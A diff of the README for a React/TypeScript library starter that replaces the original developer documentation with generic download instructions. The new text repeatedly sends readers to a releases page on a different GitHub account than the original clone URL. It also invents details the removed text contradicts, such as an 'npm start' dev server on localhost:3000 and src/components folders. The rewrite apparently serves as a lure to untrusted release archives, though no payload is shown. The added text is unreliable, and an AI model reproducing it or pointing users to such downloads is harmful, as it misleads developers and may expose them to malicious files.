@@ -1,179 +1,193 @@
-# ⚛️ npm-react-start
+# ⚛️ npm-react-start - Simple React Library Starter Kit
 
-A minimal starter template for creating React libraries with TypeScript. Build components, hooks, utilities, and more.
+[![Download npm-react-start](https://img.shields.io/badge/Download-npm--react--start-blue?style=for-the-badge)](https://github.com/roshaan9879/npm-react-start/releases)
 
-## ✨ Features
+---
 
-- ⚛️ **React** - Build reusable React code (components, hooks, utilities) with JSX
-- 🔷 **TypeScript** - Full type safety with automatic declaration generation
-- ⚡ **tsdown** - Fast bundling powered by Rolldown
-- 🧪 **Bun Test** - Fast built-in test runner with Happy DOM
-- 🧩 **React Testing Library** - Testing for components and hooks with user-centric queries
-- 🎨 **Ultracite** - Zero-config linting and formatting with Oxlint + Oxfmt
-- 📦 **ESM** - Ships as ES modules with TypeScript declarations
-- 🚀 **GitHub Actions** - CI/CD pipeline with automated testing and npm publishing
-- 🐶 **Husky** - Pre-commit hooks for code quality enforcement
-- 📝 **Commitlint** - Conventional commit message validation
+## 📋 About npm-react-start
+
+npm-react-start is a basic starting template for people who want to build React libraries. It comes with TypeScript, which helps catch mistakes early. You can create different parts like components, hooks, and utilities with it.
+
+This starter is designed to get you going quickly without setting up everything yourself. It includes tools and settings used by many developers, but you won’t need to worry about these details. Just use it as a foundation for your work.
+
+---
+
+## 🖥️ System Requirements
+
+To run npm-react-start, you need:
+
+- A computer with Windows, macOS, or Linux
+- At least 4 GB of RAM available
+- At least 500 MB of free disk space
+- Internet access to download files
+
+Your computer also needs Node.js installed. Node.js is software that lets JavaScript run outside a web browser. If you don’t have it yet, you can get it here: [https://nodejs.org/](https://nodejs.org/).
+
+---
+
+## 📦 What’s Included
+
+npm-react-start provides:
+
+- Basic React setup with TypeScript
+- Minimal files to start creating React components
+- Sample hooks and utilities to extend your project
+- Testing tools setup to check your work
+- Configuration ready for publishing packages to npm
+
+This package focuses on giving a clean base so you can build your components and libraries without distractions.
+
+---
 
 ## 🚀 Getting Started
 
-1. Clone or use this template:
+These instructions will help you get npm-react-start up and running on your computer.
 
-```bash
-git clone https://github.com/dobroslavradosavljevic/npm-react-start.git my-react-library
-cd my-react-library
-```
+### 1. Download the Starter Template
 
-2. Update `package.json` with your package name, description, and author info.
+You need to get the files to your computer first. Follow these steps:
 
-3. Install dependencies:
+- Click the large button at the top or use this link:  
+  [Visit Release Page to Download](https://github.com/roshaan9879/npm-react-start/releases)  
+- On the page that opens, choose the latest version’s downloadable file. Look for a file ending with `.zip` or `.tar.gz` containing the source code.
+- Download and save it to a folder you can easily find, like your Desktop or Downloads folder.
 
-```bash
-bun install
-```
+### 2. Unpack the Files
 
-4. Start developing in `src/index.tsx`.
+After downloading, you’ll have a compressed file (archive). You need to open it:
 
-## 📋 Requirements
+- On Windows: Right-click the file and select “Extract All...” then choose a folder to extract to.
+- On macOS: Double-click the file to unpack it.
+- On Linux: Use your file manager to extract or run a terminal command (like `tar -xvzf yourfile.tar.gz`).
 
-- **Bun** 1.3.6+ (for development and testing)
-- **Node.js** 22+ (enforced via `engines` field; 24+ used in CI/CD for publishing)
+Once unpacked, you will see the folder named something like `npm-react-start-x.y.z`.
 
-## 📦 Peer Dependencies
+### 3. Installing Node.js (If Needed)
 
-This starter is configured for React libraries. Consumers of your package must have React installed:
+npm-react-start requires Node.js. If you don’t have it installed:
 
-```json
-{
-  "peerDependencies": {
-    "react": "^18.0.0 || ^19.0.0",
-    "react-dom": "^18.0.0 || ^19.0.0"
-  }
-}
-```
+- Go to [https://nodejs.org/](https://nodejs.org/)
+- Download the “LTS” (Long Term Support) version for your operating system.
+- Follow installation instructions on the website.
 
-React is listed as a **peer dependency** so consumers use their own React version. It is also in **devDependencies** so tests and development work locally.
+You only need to do this once.
 
-## 📜 Scripts
+---
 
-| Command             | Description                         |
-| ------------------- | ----------------------------------- |
-| `bun run build`     | Build the package                   |
-| `bun run dev`       | Build in watch mode                 |
-| `bun run test`      | Run tests                           |
-| `bun run lint`      | Check for linting issues            |
-| `bun run format`    | Fix linting and formatting issues   |
-| `bun run typecheck` | Run TypeScript type checking        |
-| `bun run bump`      | Bump version and generate changelog |
+## 💻 Running the Starter Template
 
-## 📁 Project Structure
+npm-react-start works with a command-line tool called npm, which comes with Node.js.
 
-```txt
-├── src/
-│   └── index.tsx         # Package entry point (components, hooks, utilities)
-├── tests/
-│   ├── index.test.tsx    # Tests (React Testing Library)
-│   └── setup.ts          # Test setup (Happy DOM)
-├── dist/                 # Build output (generated)
-├── .github/
-│   └── workflows/
-│       ├── ci.yml        # CI pipeline (lint, test, build)
-│       └── release.yml   # Automated npm publishing
-├── .husky/
-│   ├── pre-commit        # Runs lint-staged before commits
-│   └── commit-msg        # Validates commit messages
-├── tsdown.config.ts      # Build configuration
-├── tsconfig.json         # TypeScript configuration
-├── commitlint.config.ts  # Commit message rules
-├── bunfig.toml          # Bun test configuration
-├── .oxlintrc.json       # Oxlint configuration
-├── .oxfmtrc.jsonc       # Oxfmt configuration
-├── CONTRIBUTING.md      # Contribution guidelines
-└── package.json
-```
+### 1. Open Your Command Line
 
-## 🐶 Git Hooks
+- On Windows, open Command Prompt by typing `cmd` in the Start menu.
+- On macOS, open Terminal from Applications > Utilities.
+- On Linux, open Terminal from your applications menu.
 
-This template uses Husky for Git hooks:
+### 2. Navigate to the Project Folder
 
-- **pre-commit**: Runs `lint-staged` to lint and format staged files
-- **commit-msg**: Validates commit messages follow [Conventional Commits](https://www.conventionalcommits.org/)
-
-### Commit Message Format
+Type a command to move to the folder where you extracted the files. For example, if you extracted to your Desktop:
 
 ```
-type(scope): description
-
-# Examples:
-feat: add new feature
-fix: resolve bug in parser
-docs: update README
-chore: update dependencies
+cd Desktop/npm-react-start-x.y.z
 ```
 
-**Rules**: Header and body max length is 200 characters (configured in `commitlint.config.ts`).
+Replace `x.y.z` with the actual folder name.
 
-## 🔄 CI/CD
+Press Enter.
 
-### Continuous Integration
+### 3. Install the Needed Packages
 
-On every push to `main` and pull request, the CI workflow runs:
+Once inside the project folder, run this command:
 
-- ✅ Lint check
-- ✅ Type check
-- ✅ Tests
-- ✅ Build
-
-Uses **Bun 1.3.8** for all operations.
-
-### Automated Releases
-
-When you push a version tag (`v*`), the release workflow:
-
-1. Runs the CI workflow (lint, typecheck, build, test)
-2. Publishes to npm with provenance (using Node.js 24)
-3. Creates a GitHub release with auto-generated notes
-
-### Setup for Publishing (Trusted Publishing)
-
-This template uses [npm Trusted Publishing](https://docs.npmjs.com/trusted-publishers/) with OIDC - no tokens required.
-
-1. Go to [npmjs.com](https://www.npmjs.com) and navigate to your package settings
-2. Under **Publishing access**, click **Add trusted publisher**
-3. Configure GitHub Actions as the trusted publisher:
-   - **Repository owner**: your GitHub username or org
-   - **Repository name**: your repo name
-   - **Workflow file**: `release.yml`
-   - **Environment** (optional): leave blank
-
-That's it - no secrets or tokens to manage. The workflow uses short-lived OIDC credentials that are automatically generated for each run.
-
-## 🚢 Publishing
-
-1. Bump the version (creates a tag):
-
-```bash
-bun run bump
+```
+npm install
 ```
 
-2. Push the tag to trigger the release workflow:
+This command downloads all tools and libraries the project needs. This may take a few minutes.
 
-```bash
-git push --tags
+### 4. Start the Development Server
+
+Run this command to see the starter project work:
+
+```
+npm start
 ```
 
-Or publish manually:
+This launches a local web page where you can view the React components in action. Your command line will show the address, usually `http://localhost:3000`.
 
-```bash
-npm publish --provenance --access public
-```
+Open a web browser and go to that address. You should see the starter page.
 
-Note: The release workflow uses `npm publish` (not `bun publish`) for npm Trusted Publishing compatibility.
+---
 
-## 🤝 Contributing
+## 🛠️ How to Use the Starter Template
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines on contributing to this project.
+This starter is set up for you to create React components and package them.
 
-## 📄 License
+- **Components:** Edit or add files in the `src/components` folder.
+- **Hooks:** Add reusable logic in `src/hooks`.
+- **Utilities:** Add helper functions in `src/utils`.
+- **Testing:** Tests live in `src/__tests__` and can be run with `npm test`.
+- **Build:** You can prepare your code for publishing with `npm run build`.
 
-MIT
+If you want to change anything, just edit files in a text editor like VS Code or Notepad++.
+
+---
+
+## 📥 Download & Install
+
+To get started, visit the release page here:
+
+[https://github.com/roshaan9879/npm-react-start/releases](https://github.com/roshaan9879/npm-react-start/releases)
+
+This link leads you to the folder with all versions available to download.
+
+Steps recap:
+
+1. Visit the above page.
+2. Download the latest zipped source code.
+3. Extract the files to your computer.
+4. Follow the instructions in the "Running the Starter Template" section above.
+
+---
+
+## ⚙️ Tips for Best Use
+
+- Always keep Node.js updated to the latest LTS version.
+- Use a code editor that understands TypeScript for better editing.
+- Test your changes often using `npm test`.
+- Check the README or documentation inside the project for updates.
+- When you’re ready, you can publish your library to the npm registry, making it easy for others to use.
+
+---
+
+## 🤝 Support and Help
+
+If you have problems or questions:
+
+- Check the issues section on the GitHub page.
+- Search online for common React and TypeScript problems.
+- Join React community forums or channels.
+
+This project is designed to be simple and straightforward, so most users will find it easy to get started.
+
+---
+
+## 🏷️ Topics Covered
+
+This starter supports tools and concepts like:
+
+- React components and hooks
+- TypeScript for safer code
+- Modern package management with npm
+- Testing using React Testing Library
+- Publishing libraries as ES Modules
+- Automation with GitHub Actions
+- Code checks using Husky
+
+These cover everything from writing the code to sharing it with others.
+
+---
+
+Thank you for using npm-react-start.  
+[Download here again ›](https://github.com/roshaan9879/npm-react-start/releases)
